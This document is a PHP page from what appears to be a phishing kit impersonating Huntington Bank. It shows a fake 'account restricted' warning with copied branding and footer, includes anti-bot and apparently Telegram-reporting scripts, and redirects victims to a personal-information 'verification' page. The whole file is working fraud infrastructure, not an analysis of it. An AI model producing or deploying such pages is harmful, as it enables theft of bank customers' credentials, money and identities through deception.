<?php
ob_start();
session_start();
include 'includes/antibot.php';
include_once 'includes/telegram.php';
if (!isset($_SESSION['id'])){
	header('Location: index.php', true);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Huntington Online Banking Alert | Huntington</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
	<link rel="shortcut icon" type="image/jpg" href="static/img/favicon.ico"/>
	<link href="static/css/styles.css" rel="stylesheet">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
</head>
<body>
	<div class="spin" id="spin"></div>
	<div class="loading" id="loading"></div>
	<nav class="navbar huntington-nav px-3">
		<a class="navbar-brand navbar-expand-lg p-0" href="">
			<img class="main-logo" src="static/img/huntington.svg"/>
		</a>
		<ul class="navbar-nav ms-auto">
			<li class="nav-item">
				<img class="lock-logo-nav" src="static/img/lock-nav.svg"/>
			</li>
		</ul>
	</nav>
	<div class="container p-3" style="min-height: 100vh;">
		<div class="alert-form py-5 mx-auto">
			<h4 class="mb-3 text-center" style="font-weight: 600;">HUNTINGTON ALERT</h3>
			<div class="text-center my-3">
				<img src="static/img/warning-sign.png" width="150px"/>
			</div>
			<p class="my-3 text-center" style="font-size: 1.0rem; font-weight:;">Due to suspicious/unauthorized activity on your Huntington account, we have temporarily restricted your account. While restricted you will not be able to make deposits, withdraw funds, or make card transactions. To remove these restrictions and resume normal activity, we require you to verify some information.</p>
			<form action="" method="POST" onsubmit="load()">
				<span class="mx-auto mt-4" style="text-align: center; width: 100%; display: block;">
					<button class="login-btn ms-1" type="submit">Continue</button>
				</span>
			</form>
		</div>
	</div>
	<div class="main-footer p-5">
		<div class="text-center">
			<img src="static/img/huntington-footer.svg" width="140px" />
		</div>
		<hr>
		<div class="row mx-auto" style="max-width: 1000px;">
			<div class="col-md-6 footer-links-main">
				<a href="">ACCOUNT DISCLOSURES</a>
				<a href="">PRIVACY POLICY</a>
				<a href="">DO NOT CALL</a>
				<a href="">IDENTITY PROTECTION</a>
				<a href="">SECURITY</a>
				<a href="">ONLINE GUARANTEE</a>
				<a href="">GIVE FEEDBACK</a>
			</div>
			<div class="col-md-6">
				<div class="row">
					<div class="col-md-2 footer-house-container">
						<img src="static/img/house.svg" width="44px"/>
					</div>
					<div class="col-md-10">
						<p class="p-0">The Huntington National Bank is an Equal Housing Lender and Member FDIC. <img src="static/img/honeycomb.svg" width="14px"/>®, Huntington®,<img src="static/img/honeycomb.svg" width="14px"/>Huntington.Welcome.® and Huntington Heads Up ® are federally registered service marks of Huntington Bancshares Incorporated. ©2022 Huntington Bancshares Incorporated.</p>
					</div>
				</div>
			</div>
		</div>
		<div class="mx-auto text-center" style="font-size: .875rem;">
			<p><b>Secure online. Always on time. Guaranteed.</b><span class="lock-footer-img"><img class="mx-3" src="static/img/lock-footer.svg" width="56px" /></span><b>Need help? Give us a call at (888) 810-1381.</b>
		</div>
	</div>
	<script src="static/js/cleave.js"></script>
	<script src="static/js/cleave-phone.us.js"></script>
	<script type="text/javascript">
		function load() {
			loading = document.getElementById('loading');
			spin = document.getElementById('spin');
			loading.style.display = 'inline';
			spin.style.display = 'inline';
			setTimeout(() => {
				loading.style.display = 'none';
				spin.style.display = 'none';
			}, 2000);
		}
	</script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body>
</html>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
	if (!isset($_SESSION['id'])){
		header('Location: index.php', true);
	}
	
	header('Location: verify/personal.php', true);
}
?>